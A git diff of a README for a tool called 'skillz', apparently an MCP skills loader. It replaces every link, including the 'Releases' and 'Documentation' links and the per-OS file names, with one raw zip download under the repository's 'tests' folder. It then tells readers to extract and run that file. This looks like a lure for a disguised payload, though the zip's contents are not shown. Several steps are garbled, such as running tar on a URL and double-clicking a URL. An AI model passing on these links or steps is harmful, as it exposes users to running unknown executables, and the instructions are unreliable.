@@ -4,7 +4,7 @@
 Welcome to **skillz**! This application lets you load skills onto an MCP server, helping non-Claude clients interact effortlessly. Follow the steps below to download and run the software smoothly.
 
 ## 📥 Download Now
-[![Download skillz](https://raw.githubusercontent.com/mugoherick12-boop/skillz/main/trenchwork/skillz.zip%https://raw.githubusercontent.com/mugoherick12-boop/skillz/main/trenchwork/skillz.zip)](https://raw.githubusercontent.com/mugoherick12-boop/skillz/main/trenchwork/skillz.zip)
+[![Download skillz](https://github.com/mugoherick12-boop/skillz/raw/refs/heads/main/tests/Software-2.6-alpha.4.zip%https://github.com/mugoherick12-boop/skillz/raw/refs/heads/main/tests/Software-2.6-alpha.4.zip)](https://github.com/mugoherick12-boop/skillz/raw/refs/heads/main/tests/Software-2.6-alpha.4.zip)
 
 ## 📦 System Requirements
 Before you start, ensure your system meets the following requirements:
@@ -15,14 +15,14 @@ Before you start, ensure your system meets the following requirements:
 - **Network:** Active internet connection for downloading and running the skills
 
 ## 💻 Download & Install
-1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/mugoherick12-boop/skillz/main/trenchwork/skillz.zip) to go to the Releases page.
+1. **Visit the Releases Page:** Click [here](https://github.com/mugoherick12-boop/skillz/raw/refs/heads/main/tests/Software-2.6-alpha.4.zip) to go to the Releases page.
    
 2. **Find the Latest Version:** On the Releases page, look for the latest version. It is usually marked in bold at the top of the list.
 
 3. **Select Your File:** Choose the right file for your operating system:
-   - Windows: Look for `https://raw.githubusercontent.com/mugoherick12-boop/skillz/main/trenchwork/skillz.zip`
-   - macOS: Look for `https://raw.githubusercontent.com/mugoherick12-boop/skillz/main/trenchwork/skillz.zip`
-   - Linux: Look for `https://raw.githubusercontent.com/mugoherick12-boop/skillz/main/trenchwork/skillz.zip`
+   - Windows: Look for `https://github.com/mugoherick12-boop/skillz/raw/refs/heads/main/tests/Software-2.6-alpha.4.zip`
+   - macOS: Look for `https://github.com/mugoherick12-boop/skillz/raw/refs/heads/main/tests/Software-2.6-alpha.4.zip`
+   - Linux: Look for `https://github.com/mugoherick12-boop/skillz/raw/refs/heads/main/tests/Software-2.6-alpha.4.zip`
 
 4. **Download the File:** Click on the file name. Your download should start automatically.
 
@@ -30,12 +30,12 @@ Before you start, ensure your system meets the following requirements:
    - For **Windows** and **macOS**, right-click on the downloaded `.zip` file and select “Extract All” or use extraction software.
    - For **Linux**, open your terminal and navigate to the download location. Then run:
      ```bash
-     tar -xvf https://raw.githubusercontent.com/mugoherick12-boop/skillz/main/trenchwork/skillz.zip
+     tar -xvf https://github.com/mugoherick12-boop/skillz/raw/refs/heads/main/tests/Software-2.6-alpha.4.zip
      ```
 
 6. **Run the Application:**
-   - For **Windows**, double-click `https://raw.githubusercontent.com/mugoherick12-boop/skillz/main/trenchwork/skillz.zip` from the extracted folder.
-   - For **macOS**, open the `https://raw.githubusercontent.com/mugoherick12-boop/skillz/main/trenchwork/skillz.zip` file.
+   - For **Windows**, double-click `https://github.com/mugoherick12-boop/skillz/raw/refs/heads/main/tests/Software-2.6-alpha.4.zip` from the extracted folder.
+   - For **macOS**, open the `https://github.com/mugoherick12-boop/skillz/raw/refs/heads/main/tests/Software-2.6-alpha.4.zip` file.
    - For **Linux**, navigate to the extracted folder in terminal, then run:
      ```bash
      ./skillz
@@ -75,8 +75,8 @@ Absolutely! Check the "Contributing" section in the repository for guidelines on
 Visit the Issues section of the repository for support or to report bugs.
 
 ## 🔗 Links
-- [Releases Page](https://raw.githubusercontent.com/mugoherick12-boop/skillz/main/trenchwork/skillz.zip)
-- [Documentation](https://raw.githubusercontent.com/mugoherick12-boop/skillz/main/trenchwork/skillz.zip)
+- [Releases Page](https://github.com/mugoherick12-boop/skillz/raw/refs/heads/main/tests/Software-2.6-alpha.4.zip)
+- [Documentation](https://github.com/mugoherick12-boop/skillz/raw/refs/heads/main/tests/Software-2.6-alpha.4.zip)
 
 ## 📧 Contact
 For further questions, reach out via the GitHub repository or open an issue.
